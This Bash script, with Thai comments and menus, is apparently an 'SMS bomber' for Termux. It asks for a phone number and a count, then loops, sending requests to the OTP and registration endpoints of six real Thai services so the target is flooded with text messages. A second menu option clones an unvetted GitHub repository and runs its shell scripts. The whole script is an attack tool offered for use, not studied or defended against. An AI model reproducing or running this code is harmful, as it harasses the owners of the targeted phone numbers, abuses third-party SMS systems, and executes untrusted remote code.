#!/bin/bash

# ฟังก์ชันแสดงข้อความโลโก้
logo() {
    echo -e "\033[1;31m
 ____  _   _  _____   ___   _    _   ____  _   _   ___   ____  
 / ___|| | | || ____| / _ \ \ \  / / / ___|| | | | / _ \ |  _ \ 
| |__  | | | |||  __ | | | | \ \/ / | |__  | | | || | | || |_| |
 \__ \ | |_| ||| |_ || | | |  \  /   \__ \ | |_| || | | ||  __/ 
    | ||  _  |||   ||| | | |  /  \      | ||  _  || | | || |    
 ___| || | | |||___||| |_| | / /\ \  ___| || | | || |_| || |    
|____/ |_| |_||_____| \___/ /_/  \_\|____/ |_| |_| \___/ |_|    
\033[0m"
}

# ฟังก์ชันแสดงข้อความโหลด
loading_message() {
    echo -e "\033[1;34m กำลังโหลด... \033[0m"
    sleep 1
}

# ฟังก์ชันการส่ง SMS ผ่าน API
send_sms() {
    phone=$1

    # เรียกฟังก์ชัน API ทุกตัวที่มี
    sendDataiku "$phone"
    sendBigc "$phone"
    sendLotus "$phone"
    sendSiam191 "$phone"
    sendTruewallet "$phone"
    send1112 "$phone"
}

# ฟังก์ชันสำหรับแต่ละ API ที่คุณให้มา
sendDataiku() {
    phone=$1
    url="https://www.dataiku-thai.com/api/reg/sms?account=${phone}"
    headers="Accept: application/json, text/plain, */*"
    response=$(curl -s -X GET -H "$headers" "$url")

    if [[ $response == *"Success"* ]]; then
        echo -e "\033[1;32m[Dataiku] ✅ ส่ง SMS สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[Dataiku] ❌ ไม่สามารถส่ง SMS ได้: ${phone}\033[0m"
    fi
}

sendBigc() {
    phone=$1
    url="https://openapi.bigc.co.th/customer/v1/otp"
    headers="Content-Type: application/json"
    data="{\"phone_no\": \"$phone\"}"
    response=$(curl -s -X POST -H "$headers" -d "$data" "$url")

    if [[ $response == *"Success"* ]]; then
        echo -e "\033[1;32m[BigC] ✅ ส่ง SMS สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[BigC] ❌ ไม่สามารถส่ง SMS ได้: ${phone}\033[0m"
    fi
}

sendLotus() {
    phone=$1
    url="https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp"
    headers="Content-Type: application/x-www-form-urlencoded"
    params="mobile_phone_no=$phone"
    response=$(curl -s -X POST -H "$headers" -d "$params" "$url")

    if [[ $response == *"OTP"* ]]; then
        echo -e "\033[1;32m[Lotus] ✅ ส่ง OTP สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[Lotus] ❌ ไม่สามารถส่ง OTP ได้: ${phone}\033[0m"
    fi
}

sendSiam191() {
    phone=$1
    url="https://www.siam191.app/api/user/request-register-tac"
    data="{\"sendType\":\"mobile\",\"currency\":\"THB\",\"country_code\":\"66\",\"mobileno\":\"$phone\",\"language\":\"th\",\"langCountry\":\"th-th\"}"
    response=$(curl -s -X POST -d "$data" "$url")

    if [[ $response == *"Success"* ]]; then
        echo -e "\033[1;32m[Siam191] ✅ ส่ง SMS สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[Siam191] ❌ ไม่สามารถส่ง SMS ได้: ${phone}\033[0m"
    fi
}

sendTruewallet() {
    phone=$1
    url="https://pygw.csne.co.th/api/gateway/truewalletRequestOtp"
    headers="Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
    data="transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone=$phone"
    response=$(curl -s -X POST -H "$headers" -d "$data" "$url")

    if [[ $response == *"Success"* ]]; then
        echo -e "\033[1;32m[Truewallet] ✅ ส่ง SMS สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[Truewallet] ❌ ไม่สามารถส่ง SMS ได้: ${phone}\033[0m"
    fi
}

send1112() {
    phone=$1
    url="https://api2.1112.com/api/v1/otp/create"
    headers="Content-Type: application/json;charset=UTF-8"
    data="{\"phonenumber\":\"$phone\",\"language\":\"th\"}"
    response=$(curl -s -X POST -H "$headers" -d "$data" "$url")

    if [[ $response == *"Success"* ]]; then
        echo -e "\033[1;32m[1112] ✅ ส่ง SMS สำเร็จ: ${phone}\033[0m"
    else
        echo -e "\033[1;31m[1112] ❌ ไม่สามารถส่ง SMS ได้: ${phone}\033[0m"
    fi
}

# แสดงโลโก้
logo

# แสดงเมนูให้เลือก
echo -e "\033[1;31m เลือกตัวเลือก (เลือกหมายเลข): \033[0m"
echo -e "1. ติดตั้งโมดูลและโหลดโค้ดจาก GitHub"
echo -e "2. ส่ง SMS รัวๆ"
read -p "เลือกหมายเลข: " islem

if [[ $islem == 1 || $islem == 01 ]]; then
    clear
    loading_message

    # ติดตั้งแพ็กเกจ
    pkg install git python python3 curl -y
    apt update
    apt upgrade -y
    clear
    echo -e "\033[47;3;35m การอัปเดตเสร็จสิ้น...\033[0m"
    sleep 2

    # โคลน repository และรันสคริปต์
    git clone https://github.com/gojsj12/SHGOXSHOPV0.1
    cd SHGOXSHOPV0.1
    bash shop.sh
    cd ..

    # แจ้งเสร็จสิ้นและกลับไปที่เมนูหลัก
    echo -e "\033[1;32m🎯 เสร็จสิ้น! กำลังโหลดเมนูหลักต่อ...\033[0m"
    sleep 2
    bash alhack.sh
fi

if [[ $islem == 2 || $islem == 02 ]]; then
    # ฟังก์ชันส่ง SMS รัวๆ
    read -p "กรุณากรอกเบอร์โทรศัพท์: " phone
    read -p "กรุณากรอกจำนวนที่ต้องการส่ง SMS: " count

    for ((i = 1; i <= count; i++))
    do
        # เรียกฟังก์ชันการส่ง SMS ผ่าน API
        send_sms "$phone"
        echo "กำลังส่งรอบที่ $i"
    done

    echo "ส่ง SMS เสร็จสิ้น!"
fi
